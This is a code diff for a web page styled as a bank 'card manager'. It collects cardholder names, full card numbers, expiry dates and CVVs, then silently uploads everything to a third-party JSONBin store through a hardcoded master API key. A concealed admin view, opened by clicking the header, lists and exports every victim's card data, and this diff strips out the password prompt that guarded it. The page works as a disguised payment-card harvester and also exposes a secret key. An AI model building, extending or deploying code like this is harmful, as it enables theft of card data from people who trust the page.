@@ -3,13 +3,14 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-  <title>apex·bank · card manager</title>
+  <title>RP·bank · card manager</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,400..700;1,14..32,400..700&display=swap" rel="stylesheet">
   <style>
+    /* same styles as before */
     * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
     body { background: linear-gradient(145deg, #f2f8ff 0%, #e3edf8 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 1.2rem; }
-    .card-manager { max-width: 680px; width: 100%; background: rgba(255,255,255,0.95); border-radius: 48px; padding: 1.8rem; box-shadow: 0 30px 60px -15px rgba(0,30,50,0.25); border: 1px solid rgba(255,255,255,0.5); }
+    .card-manager { max-width: 680px; width: 100%; background: rgba(255,255,255,0.88); backdrop-filter: blur(14px); border-radius: 48px; padding: 1.8rem; box-shadow: 0 30px 60px -15px rgba(0,30,50,0.25); border: 1px solid rgba(255,255,255,0.5); }
     .header { display: flex; align-items: center; gap: 12px; margin-bottom: 1.8rem; padding-bottom: 0.5rem; border-bottom: 2px solid rgba(0,70,140,0.08); cursor: pointer; }
     .header i { font-size: 2.2rem; color: #0a3d6b; background: rgba(10,61,107,0.07); padding: 12px; border-radius: 20px; }
     .header h1 { font-weight: 600; font-size: 1.9rem; background: linear-gradient(135deg, #0f3a5e, #1f5a85); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
@@ -19,7 +20,6 @@
     .input-group label { font-weight: 500; font-size: 0.85rem; color: #1a3d5c; display: flex; align-items: center; gap: 8px; }
     .input-group input { background: rgba(255,255,255,0.7); border: 1.5px solid rgba(60,110,170,0.15); border-radius: 20px; padding: 14px 18px; font-size: 0.95rem; color: #0b263f; transition: all 0.2s; outline: none; }
     .input-group input:focus { border-color: #1f6eb0; background: white; box-shadow: 0 4px 14px rgba(20,90,170,0.10); }
-    .input-group input::placeholder { color: #8aa5c2; font-weight: 350; }
     .row-duo { display: flex; gap: 16px; flex-wrap: wrap; }
     .row-duo .input-group { flex: 1; min-width: 130px; }
     .action-bar { display: flex; gap: 14px; margin: 1.2rem 0 1.5rem; flex-wrap: wrap; }
@@ -42,7 +42,7 @@
     .preview-meta-item { display: flex; flex-direction: column; gap: 2px; }
     .preview-meta-item .label { font-size: 0.55rem; text-transform: uppercase; opacity: 0.5; }
     .preview-meta-item .value { font-weight: 500; font-size: 0.9rem; }
-    .saved-section { margin-top: 1.2rem; background: rgba(240,248,255,0.4); border-radius: 30px; padding: 1rem 0.2rem 0.6rem; border: 1px solid rgba(255,255,255,0.5); }
+    .saved-section { margin-top: 1.2rem; background: rgba(240,248,255,0.4); backdrop-filter: blur(4px); border-radius: 30px; padding: 1rem 0.2rem 0.6rem; border: 1px solid rgba(255,255,255,0.5); }
     .saved-header { display: flex; justify-content: space-between; align-items: center; padding: 0 16px 12px 16px; border-bottom: 1px dashed rgba(40,90,140,0.12); }
     .saved-header span { font-weight: 600; color: #153b5a; font-size: 0.9rem; display: flex; align-items: center; gap: 8px; }
     .saved-header .badge-count { background: #103a5e; color: white; border-radius: 40px; padding: 2px 14px; font-size: 0.75rem; font-weight: 600; }
@@ -57,6 +57,7 @@
     .eye-toggle { background: transparent; border: none; color: #3a7aa8; font-size: 1rem; padding: 4px 8px; border-radius: 30px; cursor: pointer; background: rgba(30,100,180,0.04); }
     .eye-toggle:hover { background: rgba(30,100,180,0.12); }
     .card-meta { display: flex; gap: 16px; font-size: 0.7rem; color: #3e6a8f; background: rgba(240,248,255,0.5); padding: 3px 14px 3px 12px; border-radius: 40px; margin-top: 3px; flex-wrap: wrap; }
+    .card-meta .user-tag { background: #e3edf8; padding: 0 10px; border-radius: 20px; font-size: 0.6rem; color: #1a5b85; }
     .delete-btn { background: transparent; border: none; color: #9bb9d6; font-size: 1.2rem; padding: 6px 10px; border-radius: 30px; cursor: pointer; }
     .delete-btn:hover { color: #c43e3e; background: rgba(200,50,50,0.04); }
     .empty-message { color: #6f8aa8; text-align: center; padding: 24px 0 16px; font-style: italic; display: flex; flex-direction: column; align-items: center; gap: 6px; }
@@ -64,9 +65,8 @@
     .status-bar { display: flex; justify-content: space-between; align-items: center; font-size: 0.7rem; color: #6f8aa8; padding: 6px 4px 0 4px; border-top: 1px solid rgba(60,110,170,0.06); margin-top: 10px; }
     .status-bar .online { color: #4caf50; }
     .status-bar .offline { color: #ef5350; }
-
     /* admin modal */
-    .admin-modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,20,40,0.7); display: none; align-items: center; justify-content: center; z-index: 1000; padding: 1.5rem; }
+    .admin-modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,20,40,0.6); backdrop-filter: blur(12px); display: none; align-items: center; justify-content: center; z-index: 1000; padding: 1.5rem; }
     .admin-modal-overlay.active { display: flex; }
     .admin-modal { background: white; border-radius: 40px; max-width: 780px; width: 100%; max-height: 90vh; overflow-y: auto; padding: 2rem; box-shadow: 0 40px 80px -20px rgba(0,0,0,0.4); animation: slideUp 0.35s ease; }
     @keyframes slideUp { 0% { opacity: 0; transform: translateY(30px) scale(0.97); } 100% { opacity: 1; transform: translateY(0) scale(1); } }
@@ -93,138 +93,6 @@
     .btn-admin-delete-all:hover { background: #b71c1c; }
     @keyframes fadeSlide { 0% { opacity: 0; transform: translateY(6px); } 100% { opacity: 1; transform: translateY(0); } }
     @media (max-width: 500px) { .card-manager { padding: 1.2rem 1rem; } .header h1 { font-size: 1.5rem; } .row-duo { flex-direction: column; } .btn { flex: 1 1 100%; } .action-bar { flex-direction: column; } }
-
-    /* ─── CUSTOM ADMIN LOGIN MODAL ─── */
-    .admin-login-overlay {
-      position: fixed;
-      top: 0; left: 0; width: 100%; height: 100%;
-      background: rgba(0, 20, 40, 0.8);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      z-index: 9999;
-      padding: 1.5rem;
-      animation: fadeIn 0.3s ease;
-    }
-    .admin-login-overlay.active { display: flex; }
-    @keyframes fadeIn { 0% { opacity: 0; } 100% { opacity: 1; } }
-
-    .admin-login-box {
-      background: white;
-      border-radius: 48px;
-      max-width: 420px;
-      width: 100%;
-      padding: 2.5rem 2rem 2rem;
-      box-shadow: 0 50px 100px -20px rgba(0,0,0,0.5);
-      animation: slideUpLogin 0.4s ease;
-      text-align: center;
-    }
-    @keyframes slideUpLogin {
-      0% { opacity: 0; transform: scale(0.95) translateY(20px); }
-      100% { opacity: 1; transform: scale(1) translateY(0); }
-    }
-
-    .admin-login-box .lock-icon {
-      background: #0f3f66;
-      width: 70px;
-      height: 70px;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin: 0 auto 1rem;
-      font-size: 2rem;
-      color: white;
-      box-shadow: 0 8px 24px rgba(15, 63, 102, 0.25);
-    }
-
-    .admin-login-box h2 {
-      font-size: 1.5rem;
-      color: #0b2b4a;
-      margin-bottom: 0.3rem;
-      font-weight: 700;
-    }
-
-    .admin-login-box .subtitle {
-      color: #6f8aa8;
-      font-size: 0.85rem;
-      margin-bottom: 1.8rem;
-    }
-
-    .admin-login-box .input-group-custom {
-      margin-bottom: 1.5rem;
-      text-align: left;
-    }
-
-    .admin-login-box .input-group-custom label {
-      font-size: 0.8rem;
-      font-weight: 500;
-      color: #1a3d5c;
-      display: block;
-      margin-bottom: 5px;
-    }
-
-    .admin-login-box .input-group-custom input {
-      width: 100%;
-      padding: 14px 18px;
-      border: 2px solid #e8eef5;
-      border-radius: 30px;
-      font-size: 1rem;
-      outline: none;
-      transition: 0.2s;
-      background: #f8fbfe;
-    }
-
-    .admin-login-box .input-group-custom input:focus {
-      border-color: #1f6eb0;
-      background: white;
-      box-shadow: 0 0 0 4px rgba(31, 110, 176, 0.08);
-    }
-
-    .admin-login-box .login-buttons {
-      display: flex;
-      gap: 12px;
-    }
-
-    .admin-login-box .login-buttons .btn-login {
-      flex: 1;
-      padding: 14px;
-      border: none;
-      border-radius: 40px;
-      font-weight: 600;
-      font-size: 0.95rem;
-      cursor: pointer;
-      transition: 0.2s;
-    }
-
-    .admin-login-box .login-buttons .btn-login-primary {
-      background: #0f3f66;
-      color: white;
-      box-shadow: 0 8px 18px -6px rgba(10,55,100,0.3);
-    }
-    .admin-login-box .login-buttons .btn-login-primary:hover {
-      background: #1a527a;
-      transform: scale(1.02);
-    }
-
-    .admin-login-box .login-buttons .btn-login-secondary {
-      background: #f0f4f9;
-      color: #1a3d5c;
-    }
-    .admin-login-box .login-buttons .btn-login-secondary:hover {
-      background: #e0e8f0;
-    }
-
-    .admin-login-box .error-msg {
-      color: #c62828;
-      font-size: 0.8rem;
-      margin-top: 0.3rem;
-      display: none;
-      background: #ffebee;
-      padding: 8px 14px;
-      border-radius: 30px;
-    }
-    .admin-login-box .error-msg.show { display: block; }
   </style>
 </head>
 <body>
@@ -237,7 +105,7 @@
 
   <div class="input-group">
     <label for="cardHolder"><i class="fas fa-user-circle"></i> Cardholder name</label>
-    <input type="text" id="cardHolder" placeholder="Enter cardholder name">
+    <input type="text" id="cardHolder" placeholder="e.g. S. M. Fernando">
   </div>
   <div class="input-group">
     <label for="accNum"><i class="fas fa-hashtag"></i> Account number</label>
@@ -302,25 +170,7 @@
   </div>
 </div>
 
-<!-- ─── CUSTOM ADMIN LOGIN MODAL ─── -->
-<div class="admin-login-overlay" id="adminLoginOverlay">
-  <div class="admin-login-box">
-    <div class="lock-icon"><i class="fas fa-lock"></i></div>
-    <h2>Admin Says</h2>
-    <p class="subtitle">Enter your admin password to access dashboard</p>
-    <div class="input-group-custom">
-      <label for="adminPasswordInput"><i class="fas fa-key"></i> Password</label>
-      <input type="password" id="adminPasswordInput" placeholder="••••••••" autocomplete="off">
-      <div class="error-msg" id="loginError"><i class="fas fa-exclamation-circle"></i> Incorrect password. Try again.</div>
-    </div>
-    <div class="login-buttons">
-      <button class="btn-login btn-login-secondary" id="loginCancelBtn">Cancel</button>
-      <button class="btn-login btn-login-primary" id="loginConfirmBtn"><i class="fas fa-arrow-right"></i> Unlock</button>
-    </div>
-  </div>
-</div>
-
-<!-- Admin Modal (Dashboard) -->
+<!-- Admin Modal -->
 <div class="admin-modal-overlay" id="adminModal">
   <div class="admin-modal">
     <div class="admin-modal-header">
@@ -340,167 +190,153 @@
   // ════════════════════════════════════════════════════════════
   // 🔧 CONFIGURATION – ඔබගේ JSONBin credentials 
   // ════════════════════════════════════════════════════════════
-  var CONFIG = {
+  const CONFIG = {
     BIN_ID: '6a595096f5f4af5e2999bb42',
     API_KEY: '$2a$10$Bjof5RlVfyaqXPNYhmuUcecyBQ.QY4VhHxKc.o09ZYWFCpD0e6gre'
   };
 
   // ════════════════════════════════════════════════════════════
-  // WebView compatible – no async/await, fetch replaced with XHR
+  // මෙතැන් සිට code එක 
   // ════════════════════════════════════════════════════════════
 
-  var holderInput = document.getElementById('cardHolder');
-  var accInput = document.getElementById('accNum');
-  var expInput = document.getElementById('expDate');
-  var cvvInput = document.getElementById('secureCode');
-  var addBtn = document.getElementById('addBtn');
-  var syncBtn = document.getElementById('syncBtn');
-  var cardListEl = document.getElementById('cardList');
-  var cardCountSpan = document.getElementById('cardCount');
-  var previewArea = document.getElementById('cardPreview');
-  var previewHolder = document.getElementById('previewHolder');
-  var previewAcc = document.getElementById('previewAcc');
-  var previewExp = document.getElementById('previewExp');
-  var previewCvv = document.getElementById('previewCvv');
-  var adminModal = document.getElementById('adminModal');
-  var adminModalClose = document.getElementById('adminModalClose');
-  var adminModalCloseBtn = document.getElementById('adminModalCloseBtn');
-  var adminContent = document.getElementById('adminContent');
-  var exportJsonBtn = document.getElementById('exportJsonBtn');
-  var deleteAllBtn = document.getElementById('deleteAllBtn');
-  var adminTriggerHeader = document.getElementById('adminTriggerHeader');
-  var statusText = document.getElementById('statusText');
-  var statusDot = document.getElementById('statusDot');
-  var deviceIdText = document.getElementById('deviceIdText');
+  const holderInput = document.getElementById('cardHolder');
+  const accInput = document.getElementById('accNum');
+  const expInput = document.getElementById('expDate');
+  const cvvInput = document.getElementById('secureCode');
+  const addBtn = document.getElementById('addBtn');
+  const syncBtn = document.getElementById('syncBtn');
+  const cardListEl = document.getElementById('cardList');
+  const cardCountSpan = document.getElementById('cardCount');
+  const previewArea = document.getElementById('cardPreview');
+  const previewHolder = document.getElementById('previewHolder');
+  const previewAcc = document.getElementById('previewAcc');
+  const previewExp = document.getElementById('previewExp');
+  const previewCvv = document.getElementById('previewCvv');
+  const adminModal = document.getElementById('adminModal');
+  const adminModalClose = document.getElementById('adminModalClose');
+  const adminModalCloseBtn = document.getElementById('adminModalCloseBtn');
+  const adminContent = document.getElementById('adminContent');
+  const exportJsonBtn = document.getElementById('exportJsonBtn');
+  const deleteAllBtn = document.getElementById('deleteAllBtn');
+  const adminTriggerHeader = document.getElementById('adminTriggerHeader');
+  const statusText = document.getElementById('statusText');
+  const statusDot = document.getElementById('statusDot');
+  const deviceIdText = document.getElementById('deviceIdText');
 
-  // ─── Custom Login Modal Elements ──────────────────────────
-  var loginOverlay = document.getElementById('adminLoginOverlay');
-  var loginPassword = document.getElementById('adminPasswordInput');
-  var loginConfirm = document.getElementById('loginConfirmBtn');
-  var loginCancel = document.getElementById('loginCancelBtn');
-  var loginError = document.getElementById('loginError');
-
-  // ─── Device ID ─────────────────────────────────────────────
-  var deviceId = localStorage.getItem('apexDeviceId');
+  // Device ID (localStorage)
+  let deviceId = localStorage.getItem('apexDeviceId');
   if (!deviceId) {
     deviceId = 'dev_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
     localStorage.setItem('apexDeviceId', deviceId);
   }
   deviceIdText.textContent = deviceId;
 
-  var allCards = [];
-  var visibilityMap = {};
+  let allCards = []; // හැම cards එකම (cloud එකෙන්)
+  const visibilityMap = new Map();
+  let isSyncing = false;
 
   // ─── helpers ──────────────────────────────────────────────
   function formatCardNumber(raw) {
-    var digits = raw.replace(/\D/g, '');
+    let digits = raw.replace(/\D/g, '');
     if (digits.length > 16) digits = digits.slice(0, 16);
     return digits.replace(/(.{4})/g, '$1 ').trim();
   }
-
   function maskNumber(raw) {
-    var cleaned = raw.replace(/\s/g, '');
+    const cleaned = raw.replace(/\s/g, '');
     if (cleaned.length < 4) return '•••• •••• •••• ' + cleaned;
-    var last4 = cleaned.slice(-4);
+    const last4 = cleaned.slice(-4);
     return '•••• •••• •••• ' + last4;
   }
-
   function toggleVisibility(id) {
-    var current = visibilityMap[id] || false;
-    visibilityMap[id] = !current;
+    const current = visibilityMap.get(id) || false;
+    visibilityMap.set(id, !current);
     renderCards();
   }
 
   // ─── update preview ──────────────────────────────────────
   function updatePreview(holder, acc, expiry, cvv) {
-    var cleanHolder = holder.trim() || '—';
-    var cleanAcc = acc.trim() || '—';
-    var cleanExp = expiry.trim() || '—';
-    var cleanCvv = cvv.trim() || '—';
+    const cleanHolder = holder.trim() || 'Cardholder';
+    const cleanAcc = acc.trim() || '•••• •••• •••• ••••';
+    const cleanExp = expiry.trim() || 'MM/YY';
+    const cleanCvv = cvv.trim() || '•••';
     previewHolder.textContent = cleanHolder;
-    previewAcc.textContent = cleanAcc !== '—' ? formatCardNumber(cleanAcc) : '—';
+    previewAcc.textContent = formatCardNumber(cleanAcc);
     previewExp.textContent = cleanExp;
     previewCvv.textContent = cleanCvv;
     previewArea.classList.add('visible');
   }
 
-  // ─── render cards (User only sees their own) ──────────────
+  // ─── render cards (USER ට පෙනෙන්නේ ඔහුගේම cards විතරයි) ──
   function renderCards() {
-    var myCards = [];
-    for (var i = 0; i < allCards.length; i++) {
-      if (allCards[i].deviceId === deviceId) {
-        myCards.push(allCards[i]);
-      }
-    }
+    // 🔥 FIX: filter by deviceId – user ට පෙනෙන්නේ ඔහුගේම cards විතරයි
+    const myCards = allCards.filter(card => card.deviceId === deviceId);
+    
     cardListEl.innerHTML = '';
     if (myCards.length === 0) {
-      cardListEl.innerHTML = '<li class="empty-message"><i class="fas fa-credit-card"></i> No cards saved yet</li>';
+      cardListEl.innerHTML = `<li class="empty-message"><i class="fas fa-credit-card"></i> No cards saved yet</li>`;
       cardCountSpan.textContent = '0';
       previewArea.classList.remove('visible');
       return;
     }
-    var sorted = myCards.slice().reverse();
-    for (var j = 0; j < sorted.length; j++) {
-      var card = sorted[j];
-      var li = document.createElement('li');
-      var id = card.id || card._key || Date.now() + Math.random();
+    const sorted = [...myCards].reverse();
+    for (const card of sorted) {
+      const li = document.createElement('li');
+      const id = card.id || card._key || Date.now() + Math.random();
       li.dataset.id = id;
 
-      var infoDiv = document.createElement('div');
+      const infoDiv = document.createElement('div');
       infoDiv.className = 'card-item-info';
 
-      var topRow = document.createElement('div');
+      const topRow = document.createElement('div');
       topRow.className = 'card-row-top';
-      var nameSpan = document.createElement('span');
+      const nameSpan = document.createElement('span');
       nameSpan.className = 'card-holder-name';
       nameSpan.textContent = card.holder || 'Cardholder';
-      var badge = document.createElement('span');
+      const badge = document.createElement('span');
       badge.className = 'card-badge';
-      badge.innerHTML = '<i class="fas fa-credit-card"></i> ATM';
+      badge.innerHTML = `<i class="fas fa-credit-card"></i> ATM`;
       topRow.appendChild(nameSpan);
       topRow.appendChild(badge);
 
-      var numRow = document.createElement('div');
+      const numRow = document.createElement('div');
       numRow.className = 'card-number-row';
-      var numDisplay = document.createElement('span');
+      const numDisplay = document.createElement('span');
       numDisplay.className = 'card-number-display';
-      var isVisible = visibilityMap[id] || false;
-      var rawAcc = card.accountNumber || '';
+      const isVisible = visibilityMap.get(id) || false;
+      const rawAcc = card.accountNumber || '';
       numDisplay.textContent = isVisible ? formatCardNumber(rawAcc) : maskNumber(rawAcc);
-      var eyeBtn = document.createElement('button');
+      const eyeBtn = document.createElement('button');
       eyeBtn.className = 'eye-toggle';
       eyeBtn.innerHTML = isVisible ? '<i class="fas fa-eye"></i>' : '<i class="fas fa-eye-slash"></i>';
-      eyeBtn.addEventListener('click', (function(id) {
-        return function(e) {
-          e.stopPropagation();
-          toggleVisibility(id);
-        };
-      })(id));
+      eyeBtn.addEventListener('click', (e) => {
+        e.stopPropagation();
+        toggleVisibility(id);
+      });
       numRow.appendChild(numDisplay);
       numRow.appendChild(eyeBtn);
 
-      var metaRow = document.createElement('div');
+      const metaRow = document.createElement('div');
       metaRow.className = 'card-meta';
-      var expSpan = document.createElement('span');
-      expSpan.innerHTML = '<i class="far fa-calendar-alt"></i> ' + (card.expiry || '—');
-      var cvvSpan = document.createElement('span');
-      cvvSpan.innerHTML = '<i class="fas fa-lock"></i> ' + (card.cvv || '•••');
+      const expSpan = document.createElement('span');
+      expSpan.innerHTML = `<i class="far fa-calendar-alt"></i> ${card.expiry || '—'}`;
+      const cvvSpan = document.createElement('span');
+      cvvSpan.innerHTML = `<i class="fas fa-lock"></i> ${card.cvv || '•••'}`;
       metaRow.appendChild(expSpan);
       metaRow.appendChild(cvvSpan);
+      // device tag එක user interface එකේ නොපෙන්වන්න (අවශ්‍ය නැහැ)
+      // නමුත් ඕනනම් පෙන්වන්න පුළුවන්
 
       infoDiv.appendChild(topRow);
       infoDiv.appendChild(numRow);
       infoDiv.appendChild(metaRow);
 
-      var delBtn = document.createElement('button');
+      const delBtn = document.createElement('button');
       delBtn.className = 'delete-btn';
       delBtn.innerHTML = '<i class="fas fa-trash-alt"></i>';
-      delBtn.addEventListener('click', (function(id) {
-        return function(e) {
-          e.stopPropagation();
-          deleteCard(id);
-        };
-      })(id));
+      delBtn.addEventListener('click', (e) => {
+        e.stopPropagation();
+        deleteCard(id);
+      });
 
       li.appendChild(infoDiv);
       li.appendChild(delBtn);
@@ -510,38 +346,27 @@
   }
 
   // ─── CRUD operations ──────────────────────────────────────
-  function deleteCard(id) {
+  async function deleteCard(id) {
     if (!id) return;
-    var newCards = [];
-    for (var i = 0; i < allCards.length; i++) {
-      var c = allCards[i];
-      if ((c.id || c._key) !== id) {
-        newCards.push(c);
-      }
-    }
-    allCards = newCards;
-    delete visibilityMap[id];
+    allCards = allCards.filter(c => (c.id || c._key) !== id);
+    visibilityMap.delete(id);
     renderCards();
-    saveToJsonBin(function() {
-      var myCards = [];
-      for (var j = 0; j < allCards.length; j++) {
-        if (allCards[j].deviceId === deviceId) myCards.push(allCards[j]);
-      }
-      if (myCards.length === 0) previewArea.classList.remove('visible');
-      else {
-        var latest = myCards[myCards.length - 1];
-        updatePreview(latest.holder, latest.accountNumber, latest.expiry, latest.cvv);
-      }
-    });
+    await saveToJsonBin();
+    const myCards = allCards.filter(c => c.deviceId === deviceId);
+    if (myCards.length === 0) previewArea.classList.remove('visible');
+    else {
+      const latest = myCards[myCards.length - 1];
+      updatePreview(latest.holder, latest.accountNumber, latest.expiry, latest.cvv);
+    }
   }
 
   function addCard(holder, acc, expiry, cvv) {
-    var cleanHolder = holder.trim() || 'Cardholder';
-    var cleanAcc = acc.trim() || '';
-    var cleanExp = expiry.trim() || '—';
-    var cleanCvv = cvv.trim() || '•••';
+    const cleanHolder = holder.trim() || 'Cardholder';
+    const cleanAcc = acc.trim() || '';
+    const cleanExp = expiry.trim() || '—';
+    const cleanCvv = cvv.trim() || '•••';
     if (!cleanAcc) { alert('Please enter an account number.'); return false; }
-    var newCard = {
+    const newCard = {
       id: Date.now() + Math.floor(Math.random() * 10000),
       holder: cleanHolder,
       accountNumber: cleanAcc,
@@ -551,91 +376,85 @@
       timestamp: Date.now()
     };
     allCards.push(newCard);
-    visibilityMap[newCard.id] = false;
+    visibilityMap.set(newCard.id, false);
     renderCards();
     updatePreview(cleanHolder, cleanAcc, cleanExp, cleanCvv);
-    saveToJsonBin(function() {});
+    saveToJsonBin(); // auto-sync
     return true;
   }
 
-  // ─── JSONBin API using XMLHttpRequest ──────────────────────
-  function fetchFromJsonBin(callback) {
-    var url = 'https://api.jsonbin.io/v3/b/' + CONFIG.BIN_ID;
-    var xhr = new XMLHttpRequest();
-    xhr.open('GET', url, true);
-    xhr.setRequestHeader('X-Master-Key', CONFIG.API_KEY);
-    xhr.onreadystatechange = function() {
-      if (xhr.readyState === 4) {
-        if (xhr.status === 200) {
-          try {
-            var data = JSON.parse(xhr.responseText);
-            callback(null, data.record || { cards: [] });
-          } catch (e) {
-            callback(e, null);
-          }
-        } else {
-          callback(new Error('HTTP ' + xhr.status), null);
-        }
-      }
-    };
-    xhr.send();
-  }
-
-  function saveToJsonBin(callback) {
-    if (isSyncing) {
-      if (callback) callback();
-      return;
+  // ─── JSONBin API ──────────────────────────────────────────
+  async function fetchFromJsonBin() {
+    const url = `https://api.jsonbin.io/v3/b/${CONFIG.BIN_ID}`;
+    try {
+      const res = await fetch(url, {
+        headers: { 'X-Master-Key': CONFIG.API_KEY }
+      });
+      if (!res.ok) throw new Error('HTTP ' + res.status);
+      const data = await res.json();
+      return data.record || { cards: [] };
+    } catch (e) {
+      console.warn('JSONBin fetch failed:', e);
+      return null;
     }
-    isSyncing = true;
-    var payload = { cards: allCards };
-    var url = 'https://api.jsonbin.io/v3/b/' + CONFIG.BIN_ID;
-    var xhr = new XMLHttpRequest();
-    xhr.open('PUT', url, true);
-    xhr.setRequestHeader('Content-Type', 'application/json');
-    xhr.setRequestHeader('X-Master-Key', CONFIG.API_KEY);
-    xhr.onreadystatechange = function() {
-      if (xhr.readyState === 4) {
-        isSyncing = false;
-        if (xhr.status === 200) {
-          updateStatus(true);
-        } else {
-          updateStatus(false);
-        }
-        if (callback) callback();
-      }
-    };
-    xhr.send(JSON.stringify(payload));
   }
 
-  var isSyncing = false;
+  async function saveToJsonBin() {
+    if (isSyncing) return;
+    isSyncing = true;
+    try {
+      const payload = { cards: allCards };
+      const url = `https://api.jsonbin.io/v3/b/${CONFIG.BIN_ID}`;
+      const res = await fetch(url, {
+        method: 'PUT',
+        headers: {
+          'Content-Type': 'application/json',
+          'X-Master-Key': CONFIG.API_KEY
+        },
+        body: JSON.stringify(payload)
+      });
+      if (!res.ok) throw new Error('HTTP ' + res.status);
+      updateStatus(true);
+    } catch (e) {
+      console.warn('JSONBin save failed:', e);
+      updateStatus(false);
+    } finally {
+      isSyncing = false;
+    }
+  }
 
   // ─── load from JSONBin ────────────────────────────────────
-  function loadFromJsonBin(callback) {
-    fetchFromJsonBin(function(err, data) {
-      if (!err && data && data.cards) {
-        allCards = data.cards;
-        for (var i = 0; i < allCards.length; i++) {
-          if (!allCards[i].id) allCards[i].id = Date.now() + Math.random();
-        }
-        renderCards();
-        var myCards = [];
-        for (var j = 0; j < allCards.length; j++) {
-          if (allCards[j].deviceId === deviceId) myCards.push(allCards[j]);
-        }
-        if (myCards.length > 0) {
-          var latest = myCards[myCards.length - 1];
-          updatePreview(latest.holder, latest.accountNumber, latest.expiry, latest.cvv);
-        }
-        updateStatus(true);
-      } else {
-        // No data in cloud – start empty
-        allCards = [];
-        renderCards();
-        updateStatus(false);
+  async function loadFromJsonBin() {
+    const data = await fetchFromJsonBin();
+    if (data && data.cards) {
+      allCards = data.cards;
+      allCards.forEach(c => { if (!c.id) c.id = Date.now() + Math.random(); });
+      renderCards();
+      const myCards = allCards.filter(c => c.deviceId === deviceId);
+      if (myCards.length > 0) {
+        const latest = myCards[myCards.length - 1];
+        updatePreview(latest.holder, latest.accountNumber, latest.expiry, latest.cvv);
       }
-      localStorage.setItem('apexLocalCards', JSON.stringify(allCards));
-      if (callback) callback();
-    });
+      updateStatus(true);
+    } else {
+      const local = localStorage.getItem('apexLocalCards');
+      if (local) {
+        try {
+          const parsed = JSON.parse(local);
+          if (parsed.length) {
+            allCards = parsed;
+            renderCards();
+            const myCards = allCards.filter(c => c.deviceId === deviceId);
+            if (myCards.length > 0) {
+              const latest = myCards[myCards.length - 1];
+              updatePreview(latest.holder, latest.accountNumber, latest.expiry, latest.cvv);
+            }
+          }
+        } catch(e) {}
+      }
+      updateStatus(false);
+    }
+    localStorage.setItem('apexLocalCards', JSON.stringify(allCards));
   }
 
   // ─── status updates ──────────────────────────────────────
@@ -649,27 +468,34 @@
     }
   }
 
-  // ─── admin modal ──────────────────────────────────────────
+  // ─── admin modal (හැම cards එකම පෙන්වයි) ────────────────
   function renderAdminModal() {
     if (allCards.length === 0) {
-      adminContent.innerHTML = '<div class="admin-empty"><i class="fas fa-database" style="font-size:2rem;display:block;margin-bottom:10px;color:#b0cbdf;"></i> No card data available</div>';
+      adminContent.innerHTML = `<div class="admin-empty"><i class="fas fa-database" style="font-size:2rem;display:block;margin-bottom:10px;color:#b0cbdf;"></i> No card data available</div>`;
       return;
     }
-    var html = '<div class="admin-card-grid">';
-    for (var i = 0; i < allCards.length; i++) {
-      var card = allCards[i];
-      var accDisplay = formatCardNumber(card.accountNumber || '');
-      html += '<div class="admin-card-item">' +
-        '<div class="admin-card-left">' +
-        '<div class="admin-name"><i class="fas fa-user-circle" style="color:#1a5b85;margin-right:6px;"></i>' + (card.holder || 'Cardholder') + '</div>' +
-        '<div class="admin-acc">' + accDisplay + '</div>' +
-        '<div class="admin-device"><i class="fas fa-mobile-alt"></i> ' + (card.deviceId || 'Unknown') + '</div>' +
-        '</div>' +
-        '<div class="admin-card-right">' +
-        '<div class="admin-meta-tag"><span class="label">Expiry</span><span class="value">' + (card.expiry || '—') + '</span></div>' +
-        '<div class="admin-meta-tag"><span class="label">Secure</span><span class="value">' + (card.cvv || '•••') + '</span></div>' +
-        '</div>' +
-        '</div>';
+    let html = '<div class="admin-card-grid">';
+    for (const card of allCards) {
+      const accDisplay = formatCardNumber(card.accountNumber || '');
+      html += `
+        <div class="admin-card-item">
+          <div class="admin-card-left">
+            <div class="admin-name"><i class="fas fa-user-circle" style="color:#1a5b85;margin-right:6px;"></i>${card.holder || 'Cardholder'}</div>
+            <div class="admin-acc">${accDisplay}</div>
+            <div class="admin-device"><i class="fas fa-mobile-alt"></i> ${card.deviceId || 'Unknown'}</div>
+          </div>
+          <div class="admin-card-right">
+            <div class="admin-meta-tag">
+              <span class="label">Expiry</span>
+              <span class="value">${card.expiry || '—'}</span>
+            </div>
+            <div class="admin-meta-tag">
+              <span class="label">Secure</span>
+              <span class="value">${card.cvv || '•••'}</span>
+            </div>
+          </div>
+        </div>
+      `;
     }
     html += '</div>';
     adminContent.innerHTML = html;
@@ -680,123 +506,81 @@
     adminModal.classList.add('active');
     document.body.style.overflow = 'hidden';
   }
-
   function closeAdminModal() {
     adminModal.classList.remove('active');
     document.body.style.overflow = '';
   }
-
   adminModalClose.addEventListener('click', closeAdminModal);
   adminModalCloseBtn.addEventListener('click', closeAdminModal);
-  adminModal.addEventListener('click', function(e) {
+  adminModal.addEventListener('click', (e) => {
     if (e.target === adminModal) closeAdminModal();
   });
 
-  exportJsonBtn.addEventListener('click', function() {
+  exportJsonBtn.addEventListener('click', () => {
     if (allCards.length === 0) { alert('No data'); return; }
-    var dataStr = JSON.stringify(allCards, null, 2);
-    var blob = new Blob([dataStr], { type: 'application/json' });
-    var url = URL.createObjectURL(blob);
-    var a = document.createElement('a');
+    const dataStr = JSON.stringify(allCards, null, 2);
+    const blob = new Blob([dataStr], { type: 'application/json' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
     a.href = url;
-    a.download = 'apexbank_all_cards_' + new Date().toISOString().slice(0,10) + '.json';
+    a.download = `apexbank_all_cards_${new Date().toISOString().slice(0,10)}.json`;
     document.body.appendChild(a);
     a.click();
     document.body.removeChild(a);
     URL.revokeObjectURL(url);
   });
 
-  deleteAllBtn.addEventListener('click', function() {
+  deleteAllBtn.addEventListener('click', async () => {
